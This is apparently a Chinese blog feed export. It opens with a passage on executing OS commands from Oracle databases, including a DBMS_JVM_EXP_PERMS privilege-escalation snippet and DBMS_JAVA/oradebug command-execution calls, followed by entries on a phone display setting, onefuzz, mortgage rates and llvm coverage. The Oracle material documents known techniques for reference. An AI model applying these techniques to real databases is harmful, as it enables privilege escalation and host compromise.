dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>, <span class="hljs-string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="hljs-string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;execute&#x27;</span>);<br><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>,<span class="hljs-string">&#x27;SYS:java.lang.RuntimePermission&#x27;</span>, <span class="hljs-string">&#x27;writeFileDescriptor&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>,<span class="hljs-string">&#x27;SYS:java.lang.RuntimePermission&#x27;</span>, <span class="hljs-string">&#x27;readFileDescriptor&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="1-1-4-实验结果"><a href="#1-1-4-实验结果" class="headerlink" title="1.1.4 实验结果"></a>1.1.4 实验结果</h4><p>非常不错支持回显。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">exec</span> javacmdproc(<span class="hljs-string">&#x27;/bin/uname -a&#x27;</span>);<br>Linux localhost.localdomain <span class="hljs-number">2.6</span><span class="hljs-number">.32</span><span class="hljs-number">-100.34</span><span class="hljs-number">.1</span>.el6uek.i686 #<span class="hljs-number">1</span> SMP Wed May <span class="hljs-number">25</span><br><span class="hljs-number">17</span>:<span class="hljs-number">28</span>:<span class="hljs-number">36</span> EDT <span class="hljs-number">2011</span> i686 i686 i386 GNU<span class="hljs-operator">/</span>Linux<br><br>PL<span class="hljs-operator">/</span><span class="hljs-keyword">SQL</span> <span class="hljs-keyword">procedure</span> successfully completed.<br></code></pre></td></tr></table></figure><h4 id="1-1-5-注意"><a href="#1-1-5-注意" class="headerlink" title="1.1.5 注意"></a>1.1.5 注意</h4><p>需要使用全路径</p><h3 id="1-2-DBMS-SCHEDULAR"><a href="#1-2-DBMS-SCHEDULAR" class="headerlink" title="1.2 DBMS_SCHEDULAR"></a>1.2 DBMS_SCHEDULAR</h3><h4 id="1-2-1-DBMS-SCHEDULAR-简介"><a href="#1-2-1-DBMS-SCHEDULAR-简介" class="headerlink" title="1.2.1 DBMS_SCHEDULAR 简介"></a>1.2.1 DBMS_SCHEDULAR 简介</h4><p>这个和Windows上的计划任务类似。</p><h4 id="1-2-2-需要的权限"><a href="#1-2-2-需要的权限" class="headerlink" title="1.2.2 需要的权限"></a>1.2.2 需要的权限</h4><ol><li>CREATE JOB</li><li>CREATE EXTERNAL JOB</li><li>EXECUTE on dbms_scheduler (granted to public by default)</li></ol><p><code>grant create job, create external job to scott ;</code></p><h4 id="1-2-3-执行的语句"><a href="#1-2-3-执行的语句" class="headerlink" title="1.2.3 执行的语句"></a>1.2.3 执行的语句</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java">BEGIN<br>DBMS_SCHEDULER.CREATE_PROGRAM (<br>program_name=&gt; <span class="hljs-string">&#x27;MyCmd&#x27;</span>,<br>program_type=&gt; <span class="hljs-string">&#x27;EXECUTABLE&#x27;</span>,<br>-- Use the ampersand to <span class="hljs-keyword">break</span> <span class="hljs-type">out</span><br><span class="hljs-variable">program_action</span> <span class="hljs-operator">=</span>&gt; <span class="hljs-string">&#x27;/tmp/a.sh&#x27;</span>,<br>enabled=&gt; TRUE,<br>comments=&gt; <span class="hljs-string">&#x27;Run a command using shell metacharacters.&#x27;</span><br> );<br>END;<br>/<br><br>BEGIN<br>DBMS_SCHEDULER.CREATE_JOB (<br>   job_name=&gt; <span class="hljs-string">&#x27;X&#x27;</span>,<br>   program_name=&gt; <span class="hljs-string">&#x27;MyCmd&#x27;</span>,<br>   repeat_interval=&gt; <span class="hljs-string">&#x27;FREQ=SECONDLY;INTERVAL=10&#x27;</span>,<br>   enabled=&gt; TRUE,<br>   comments=&gt; <span class="hljs-string">&#x27;Every 10 seconds&#x27;</span>);<br>END;<br>/<br><br>exec DBMS_SCHEDULER.RUN_JOB ( job_name=&gt; <span class="hljs-string">&#x27;X&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="1-2-4-注意"><a href="#1-2-4-注意" class="headerlink" title="1.2.4 注意"></a>1.2.4 注意</h4><ol><li>原先使用 || 等 metacharacters 的bug已经修复，只能使用参数</li><li>Windows系统必须开启OracleJobSchedulerSID 服务</li><li>Linux系统上相关文件的权限必须正确</li><li>高版本的Linux，执行的group已经被Oracle将为nobody</li></ol><p>总之这个方法局限行很大，不推荐使用，列在这里只是做一个备忘。</p><h3 id="1-3-使用oradebug"><a href="#1-3-使用oradebug" class="headerlink" title="1.3 使用oradebug"></a>1.3 使用oradebug</h3><ul><li>oradebug 简介<br>oradebug是一个神奇的命令, 能干很多活, 但是Oracle却很少提及，属于undocumented<br>状态，是给oracle的工程师使用的，主要用于调试和性能调优。可以使用 oradebug help<br>命令，查看oradebug的用法</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs routeros">SQL&gt; oradebug help<br>HELP           [command]                 Describe one <span class="hljs-keyword">or</span> all commands<br>SETMYPID                                 <span class="hljs-built_in">Debug</span> current process<br>SETOSPID       &lt;ospid&gt;                   <span class="hljs-built_in">Set</span> OS pid of process <span class="hljs-keyword">to</span> <span class="hljs-built_in">debug</span><br>SETORAPID      &lt;orapid&gt; [<span class="hljs-string">&#x27;force&#x27;</span>]        <span class="hljs-built_in">Set</span> Oracle pid of process <span class="hljs-keyword">to</span> <span class="hljs-built_in">debug</span><br>SETORAPNAME    &lt;orapname&gt;                <span class="hljs-built_in">Set</span> Oracle process name <span class="hljs-keyword">to</span> <span class="hljs-built_in">debug</span><br>SHORT_STACK                              <span class="hljs-built_in">Get</span> abridged OS stack<br>CURRENT_SQL                              <span class="hljs-built_in">Get</span> current SQL<br>DUMP           &lt;dump_name&gt; &lt;lvl&gt; [addr]  Invoke named dump<br>DUMPSGA        [bytes]                   Dump fixed SGA<br>DUMPLIST                                 <span class="hljs-built_in">Print</span> a list of available dumps<br>EVENT          &lt;text&gt;                    <span class="hljs-built_in">Set</span> trace event <span class="hljs-keyword">in</span> process<br>SESSION_EVENT  &lt;text&gt;                    <span class="hljs-built_in">Set</span> trace event <span class="hljs-keyword">in</span> session<br>DUMPVAR        &lt;p|s|uga&gt; &lt;name&gt; [level]  Print/dump a fixed PGA/SGA/UGA variable<br>DUMPTYPE       &lt;address&gt; &lt;type&gt; &lt;count&gt;  Print/dump an<span class="hljs-built_in"> address </span>with<span class="hljs-built_in"> type </span><span class="hljs-built_in">info</span><br>SETVAR         &lt;p|s|uga&gt; &lt;name&gt; &lt;value&gt;  Modify a fixed PGA/SGA/UGA variable<br>PEEK           &lt;addr&gt; &lt;len&gt; [level]      Print/Dump memory<br>POKE           &lt;addr&gt; &lt;len&gt; &lt;value&gt;      Modify memory<br>WAKEUP         &lt;orapid&gt;                  Wake up Oracle process<br>SUSPEND                                  Suspend execution<br>RESUME                                   Resume execution<br>FLUSH                                    Flush pending writes <span class="hljs-keyword">to</span> trace file<br>CLOSE_TRACE                              Close trace file<br>TRACEFILE_NAME                           <span class="hljs-built_in">Get</span> name of trace file<br>LKDEBUG                                  Invoke global enqueue<span class="hljs-built_in"> service </span>debugger<br>NSDBX                                    Invoke CGS name-service debugger<br>-G             &lt;Inst-List | def | all&gt;   Parallel oradebug command<span class="hljs-built_in"> prefix</span><br><span class="hljs-built_in"></span>-R             &lt;Inst-List | def | all&gt;   Parallel oradebug<span class="hljs-built_in"> prefix </span>(return output<br>SETINST        &lt;instance# <span class="hljs-built_in">..</span> | all&gt;      <span class="hljs-built_in">Set</span><span class="hljs-built_in"> instance </span>list <span class="hljs-keyword">in</span> double quotes<br>SGATOFILE      &lt;SGA dump dir&gt;         Dump SGA <span class="hljs-keyword">to</span> file; dirname <span class="hljs-keyword">in</span> double quotes<br>DMPCOWSGA      &lt;SGA dump dir&gt; Dump &amp; map SGA as COW; dirname <span class="hljs-keyword">in</span> double quotes<br>MAPCOWSGA      &lt;SGA dump dir&gt;         Map SGA as COW; dirname <span class="hljs-keyword">in</span> double quotes<br>HANGANALYZE    [level] [syslevel]        Analyze<span class="hljs-built_in"> system </span>hang<br>FFBEGIN                                  Flash Freeze the<span class="hljs-built_in"> Instance</span><br><span class="hljs-built_in"></span>FFDEREGISTER                             FF deregister<span class="hljs-built_in"> instance </span><span class="hljs-keyword">from</span> cluster<br>FFTERMINST                               Call exit <span class="hljs-keyword">and</span> terminate<span class="hljs-built_in"> instance</span><br><span class="hljs-built_in"></span>FFRESUMEINST                             Resume the flash frozen<span class="hljs-built_in"> instance</span><br><span class="hljs-built_in"></span>FFSTATUS                                 Flash freeze status of<span class="hljs-built_in"> instance</span><br><span class="hljs-built_in"></span>SKDSTTPCS      &lt;ifname&gt;  &lt;ofname&gt;        Helps translate PCs <span class="hljs-keyword">to</span> names<br>WATCH          &lt;address&gt; &lt;len&gt; &lt;self|exist|all|target&gt;  Watch a region of memory<br>DELETE         &lt;local|global|target&gt; watchpoint &lt;id&gt;    Delete a watchpoint<br>SHOW           &lt;local|global|target&gt; watchpoints        Show  watchpoints<br>DIRECT_ACCESS  &lt;set/enable/<span class="hljs-built_in">disable</span> command | select query&gt; Fixed table access<br>CORE                                     Dump core without crashing process<br>IPC                                      Dump ipc information<br>UNLIMIT                                  Unlimit the size of the trace file<br>PROCSTAT                                 Dump process statistics<br>CALL           [-t count] &lt;func&gt; [arg1]<span class="hljs-built_in">..</span>.[argn]  Invoke function with arguments<br></code></pre></td></tr></table></figure><p>功能非常丰富， 下面我们用到的是 CALL 可以直接调用oracle进程使用的函数。</p><h4 id="执行的语句"><a href="#执行的语句" class="headerlink" title="执行的语句"></a>执行的语句</h4><p><code>oradebug setmypid; oradebug call system &quot;/usr/bin/whoami      &gt;/tmp/ret&quot;;</code></p><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ol><li>这里权限要求是SYSDBA</li><li>双引号里必须是使用TAB而不能使用空格</li><li>Linux 和 Windows 下的ORACLE都能利用成功</li></ol><h2 id="2-黑客方法"><a href="#2-黑客方法" class="headerlink" title="2. 黑客方法"></a>2. 黑客方法</h2><p>下面用到的两个方法是David Litchfield 在Blackhat DC 2010 上公开两个方法,通过逆向<br>发现。结合DBMS_JVM_EXP_PERMS的漏洞可以直接执行系统命令(DBMS_JVM_EXP_PERMS 漏洞<br>已经被被修复)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">DECLARE<br>POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;<br>CURSOR C1 IS SELECT ‘GRANT’,USER(), ‘SYS’,<span class="hljs-string">&#x27;java.io.FilePermission’,’&lt;&lt;ALL FILES&gt;&gt;‘,’execute’,&#x27;</span>ENABLED’ from dual;<br>BEGIN<br>OPEN C1;<br>FETCH C1 BULK COLLECT INTO POL;<br>CLOSE C1;<br>DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);<br>END;<br>/<br></code></pre></td></tr></table></figure><p>在有漏洞的DBMS_JVM_EXP_PERMS package的Oracle上执行上述语句，有create session<br>权限的用户可以给自己授权所有java 权限。</p><h3 id="2-1-DBMS-JAVA-TEST-FUNCALL"><a href="#2-1-DBMS-JAVA-TEST-FUNCALL" class="headerlink" title="2.1 DBMS_JAVA_TEST.FUNCALL"></a>2.1 DBMS_JAVA_TEST.FUNCALL</h3><h4 id="2-1-1-执行的语句"><a href="#2-1-1-执行的语句" class="headerlink" title="2.1.1 执行的语句"></a>2.1.1 执行的语句</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Select</span> DBMS_JAVA_TEST.FUNCALL(<span class="hljs-string">&#x27;oracle/aurora/util/Wrapper&#x27;</span>,<span class="hljs-string">&#x27;main&#x27;</span>,<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,<span class="hljs-string">&#x27;/bin/ls&gt;/tmp/OUT2.LST&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure><h4 id="2-1-2-需要的权限"><a href="#2-1-2-需要的权限" class="headerlink" title="2.1.2 需要的权限"></a>2.1.2 需要的权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>, <span class="hljs-string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="hljs-string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;execute&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="2-1-3-受影响系统"><a href="#2-1-3-受影响系统" class="headerlink" title="2.1.3 受影响系统"></a>2.1.3 受影响系统</h4><p>11g R1, 11g R2</p><h3 id="2-2-DBMS-JAVA-RUNJAVA"><a href="#2-2-DBMS-JAVA-RUNJAVA" class="headerlink" title="2.2 DBMS_JAVA.RUNJAVA"></a>2.2 DBMS_JAVA.RUNJAVA</h3><h4 id="2-2-1-执行的语句"><a href="#2-2-1-执行的语句" class="headerlink" title="2.2.1 执行的语句"></a>2.2.1 执行的语句</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> DBMS_JAVA.RUNJAVA(<span class="hljs-string">&#x27;oracle/aurora/util/Wrapper /bin/bash -c /bin/ls&gt;/tmp/OUT.LST&#x27;</span>) <span class="hljs-keyword">FROM</span> DUAL;<br></code></pre></td></tr></table></figure><h4 id="2-2-2-需要的权限"><a href="#2-2-2-需要的权限" class="headerlink" title="2.2.2 需要的权限"></a>2.2.2 需要的权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>, <span class="hljs-string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="hljs-string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;execute&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="2-2-3-受影响系统"><a href="#2-2-3-受影响系统" class="headerlink" title="2.2.3 受影响系统"></a>2.2.3 受影响系统</h4><p>10g R2, 11g R1, 11g R2</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="http://www.orafaq.com/scripts/plsql/oscmd.txt">Using Java to run os command</a></li><li><a href="http://docs.oracle.com/cd/B28359_01/server.111/b28310/scheduse002.htm#CHDIDGAE">DBMS_SCHEDULER</a></li><li><a href="http://www.juliandyke.com/Diagnostics/Tools/ORADEBUG/ORADEBUG.html">oradebug</a></li><li><a href="">BlackHat-DC-2010-Litchfield-Oracle11g</a></li><li><a href="http://media.blackhat.com/bh-us-10/whitepapers/Siddharth/BlackHat-USA-2010-Siddharth-Hacking-Oracle-from-the-Web-wp.pdf">Hacking Oracle from the Web</a></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一加 (oneplus ) 3T 非root 开启 P3 色域</title>
    <link href="/cn/oneplus3T_p3/"/>
    <url>/cn/oneplus3T_p3/</url>
    
    <content type="html"><![CDATA[<p>一加3T其实和一加5用的是同一块屏幕，网上流传的方法多需要root权限。非root 开启 p3 色域的方法，<br>连接 adb 输入下面的命令 <code>settings put system screen_color_mode_settings_value 4</code> 实测有效，重启后不失效。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>onefuzz 简单分析</title>
    <link href="/cn/onefuzz/"/>
    <url>/cn/onefuzz/</url>
    
    <content type="html"><![CDATA[<h2 id="deploy-agent-部署"><a href="#deploy-agent-部署" class="headerlink" title="deploy agent (部署)"></a>deploy agent (部署)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">unzip onefuzz-deployment-<span class="hljs-variable">$VERSION</span>.zip<br>pip install -r requirements.txt<br>./deploy.py <span class="hljs-variable">$REGION</span> <span class="hljs-variable">$RESOURCE_GROUP_NAME</span> <span class="hljs-variable">$ONEFUZZ_INSTANCE_NAME</span> <span class="hljs-variable">$CONTACT_EMAIL_ADDRESS</span><br></code></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/cli/azure/authenticate-azure-cli?view=azure-cli-latest">Azure CLI logged in</a> 后，执行上面命令可以在 Azure 上部署 agent</p><p>需要订阅 Azure， 可能要收费</p><h2 id="安装-onefuzz-CLI"><a href="#安装-onefuzz-CLI" class="headerlink" title="安装 onefuzz CLI"></a>安装 onefuzz CLI</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://github.com/microsoft/onefuzz/releases/download/1.0.0/onefuzz-1.0.0-py3-none-any.whl<br>wget https://github.com/microsoft/onefuzz/releases/download/1.0.0/onefuzztypes-1.0.0-py3-none-any.whl<br>pip install ./onefuzz*.whl<br></code></pre></td></tr></table></figure><h2 id="执行-fuzz-任务"><a href="#执行-fuzz-任务" class="headerlink" title="执行 fuzz 任务"></a>执行 fuzz 任务</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">onefuzz template libfuzzer basic <span class="hljs-keyword">my</span>-project <span class="hljs-keyword">my</span>-target build<span class="hljs-number">-1</span> <span class="hljs-keyword">my</span>-pool <span class="hljs-comment">--target_exe fuzz.exe</span><br></code></pre></td></tr></table></figure><h2 id="支持的平台"><a href="#支持的平台" class="headerlink" title="支持的平台"></a>支持的平台</h2><ol><li>Python 的 CLI 客户端，需要 Python 3.7 +</li><li>Azure 的 OS image 支持 Windows 10 和 Ubuntu Server 18.04</li><li>libfuzzer 支持 llvm 8+ (windows, Linux x86&#x2F;x64), MSVC 16.8+ (支持 ASAN)</li></ol><h2 id="支持的-Fuzz-工具"><a href="#支持的-Fuzz-工具" class="headerlink" title="支持的 Fuzz 工具"></a>支持的 Fuzz 工具</h2><p>onefuzz 中集成了几个 fuzz 工具： afl afl++ libfuzzer 和 radasma</p><h2 id="OneFuzz-的主要工作"><a href="#OneFuzz-的主要工作" class="headerlink" title="OneFuzz 的主要工作"></a>OneFuzz 的主要工作</h2><p>主要工作是利用微软的 Azure 云平台进行 fuzz，实现了 Python 版本的接口，可以远程直接操作 Azure 的资源进行 fuzz</p><p>api 接口： <a href="https://github.com/microsoft/onefuzz/tree/main/src/api-service/__app__">api-service</a><br>agent： <a href="https://github.com/microsoft/onefuzz/tree/main/src/agent">agent</a></p><h2 id="项目进展情况"><a href="#项目进展情况" class="headerlink" title="项目进展情况"></a>项目进展情况</h2><p>onefuzz 项目主要是一个 fuzz 框架，项目成熟度不高和 Google 的 ClusterFuzz 相比有较大差距。Fuzz 过程也是简单调用fuzz 工具，没有处理特殊情况。文档完备程度也不高，比较感兴趣的 MSVC 和 libfuzzer、ASAN 的集成也没有看到具体代码。另外和微软的 Azrue 深度绑定，用起来也不是太方便，后续将继续关注此项目的进展情况。</p><h2 id="一些有用的链接"><a href="#一些有用的链接" class="headerlink" title="一些有用的链接"></a>一些有用的链接</h2><p><a href="https://github.com/microsoft/onefuzz/blob/main/docs/getting-started.md">https://github.com/microsoft/onefuzz/blob/main/docs/getting-started.md</a><br><a href="https://github.com/microsoft/onefuzz/blob/main/docs/supported-platforms.md">https://github.com/microsoft/onefuzz/blob/main/docs/supported-platforms.md</a></p><h2 id="在线演示"><a href="#在线演示" class="headerlink" title="在线演示"></a>在线演示</h2><p><img src="https://raw.githubusercontent.com/microsoft/onefuzz/main/docs/screencasts/launching-job.gif" alt="launching-job"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>lpr 和房贷的那些事</title>
    <link href="/cn/lpr/"/>
    <url>/cn/lpr/</url>
    
    <content type="html"><![CDATA[<h2 id="原来的机制"><a href="#原来的机制" class="headerlink" title="原来的机制"></a>原来的机制</h2><p>在 LPR 之前，我国贷款利率锚定 中国人民银行发布的 “贷款基准利率”。</p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">房贷利率 </span>=<span class="hljs-string"> 贷款基准利率 x （1 + 浮动）</span><br></code></pre></td></tr></table></figure><p>浮动可以上浮，也可以下浮， 上浮意味着贷款利率大于贷款基准利率，反之下浮则是小于。</p><h2 id="LPR-新机制"><a href="#LPR-新机制" class="headerlink" title="LPR 新机制"></a>LPR 新机制</h2><p>MLF 是我国央行向商业银行放贷的一种方式 （中期借款便利），商业银行将一些抵押物质押给央行，换取一定期限，数额的贷款，同时向央行支付利息。央行通过控制 MLF 的数量总额和利率，从而影响市场。</p><p>商业银行可以选择从央行贷款，也可以使用从其他银行贷款，所以 MLF 不能偏离市场太多，也是一种市场化的利率调控手段。</p><p>商业银行拿到资金后，需要放贷给个人和企业，放贷需要参考央行的基准利率。所以这种市场上就有两种利率，如果贷款的基准利率过高，钱就会滞留银行，这样就引入了 LPR。</p><p>锚定 LPR，也就是浮动利率，会随着市场上资金的充盈程度变化。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">LPR</span> = MLF 利率 + 风险利润加点<br></code></pre></td></tr></table></figure><p>风险利润加点由 18家银行决定，这18家银行是 中国工商银行，中国农业银行，中国建设银行，交通银行，中信银行，招商银行，兴业银行，浦东发展银行，中国民生银行，西安银行，台州银行，上海农村商业银行， 广东顺德农村商业银行，渣打银行（中国），花旗银行（中国），微众银行，网商银行。</p><p>LPR 利率有18家报价，去掉一个最高值，去掉一个最低值，剩下16家取算术平均取得。</p><p>个人或者企业向银行贷款时的利率，通过 LPR 计算。</p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">房贷利率 </span>=<span class="hljs-string"> LPR 利率 + 加点</span><br></code></pre></td></tr></table></figure><p>同样加点可以上浮，也可以下浮，这个是你和银行之间的协议加点。最终的利率还和政策加点有关，比如有的城市规定，二套房上浮 60个基点 （一个基点为 0.01 %），即上浮 0.6%</p><p>所以最终的公式为：</p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">房贷利率 </span>=<span class="hljs-string"> LPR 利率 + 政策加点 + 协议加点</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>llvm Coverage 可视化</title>
    <link href="/cn/llvm_coverage/"/>
    <url>/cn/llvm_coverage/</url>
    
    <content type="html"><![CDATA[<h2 id="Google-提供的工具"><a href="#Google-提供的工具" class="headerlink" title="Google 提供的工具"></a>Google 提供的工具</h2><p>Google 提供了一个工具 <a href="https://cs.chromium.org/chromium/src/tools/code_coverage/coverage.py">https://cs.chromium.org/chromium/src/tools/code_coverage/coverage.py</a></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript">$ gn gen out/coverage <span class="hljs-string">\</span><br>    --args=<span class="hljs-string">&#x27;use_clang_coverage=true is_component_build=false dcheck_always_on=true&#x27;</span><br>$ python tools/code_coverage/coverage.py <span class="hljs-string">\</span><br>    crypto_unittests url_unittests <span class="hljs-string">\</span><br>    -b out/coverage -o out/report <span class="hljs-string">\</span><br>    -c <span class="hljs-string">&#x27;out/coverage/crypto_unittests&#x27;</span> <span class="hljs-string">\</span><br>    -c <span class="hljs-string">&#x27;out/coverage/url_unittests --gtest_filter=URLParser.PathURL&#x27;</span> <span class="hljs-string">\</span><br>    -f url/ -f crypto/<br></code></pre></td></tr></table></figure><p>一些参数的含义:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-b 测试 coverage 的 target 的路径</span><br><span class="hljs-deletion">-o 输出报告的路径</span><br><span class="hljs-deletion">-c 测试 coverage 的命令行</span><br><span class="hljs-deletion">-f 过滤，只显示某些路径的 coverage</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/henices/pictures/master/20190111174252715_1005029405.png" alt="workflow"></p><p>实际操作表明， coverage.py 不是太好用。 还是需要一步一步来，比较稳妥。</p><h2 id="0-编译"><a href="#0-编译" class="headerlink" title="(0)  编译"></a>(0)  编译</h2><p>在 chromium 项目下，可以直接使用 <code>use_clang_coverage=true and is_component_build=false</code><br>如果不是 chromium 项目， 则需要自己 指定参数， 例如在 skia 项目中，可以这么写：</p><p>args.gn</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">cc</span> = <span class="hljs-string">&quot;/home/henices/clang7/bin/clang&quot;</span><br><span class="hljs-attr">cxx</span> = <span class="hljs-string">&quot;/home/henices/clang7/bin/clang++&quot;</span><br><span class="hljs-attr">extra_cflags</span> = [ <span class="hljs-string">&quot;-fprofile-instr-generate&quot;</span>, <span class="hljs-string">&quot;-fcoverage-mapping&quot;</span> ]<br><span class="hljs-attr">extra_ldflags</span> = [ <span class="hljs-string">&quot;-fprofile-instr-generate&quot;</span>,  <span class="hljs-string">&quot;-fcoverage-mapping&quot;</span> ]<br></code></pre></td></tr></table></figure><p>如果是自己的项目，使用 clang 编译时加上这两个参数 -fprofile-instr-generate -fcoverage-mapping</p><h2 id="1-生成-Raw-Profiles-文件"><a href="#1-生成-Raw-Profiles-文件" class="headerlink" title="(1) 生成 Raw Profiles 文件"></a>(1) 生成 Raw Profiles 文件</h2><p><code>export LLVM_PROFILE_FILE=&quot;out/report/target.%4m.profraw&quot;</code>  使用这个命令<br>限制 profraw 文件的个数。</p><p>%p      进程 ID<br>%h      hostname<br>%Nm  生成几个 profraw 文件</p><p>写个循环，将所有的样本跑一遍。 timeout 10 指定程序超时时间。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i  <span class="hljs-keyword">in</span> path ; <span class="hljs-keyword">do</span> <span class="hljs-built_in">timeout</span> 10 target  <span class="hljs-variable">$i</span> ; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>将在 out&#x2F;report 目录下， 生成  profraw 文件， 如果没有生成， 则说明上面的代码编译出了问题。</p><h2 id="2-生成-Indexed-Profile"><a href="#2-生成-Indexed-Profile" class="headerlink" title="(2) 生成 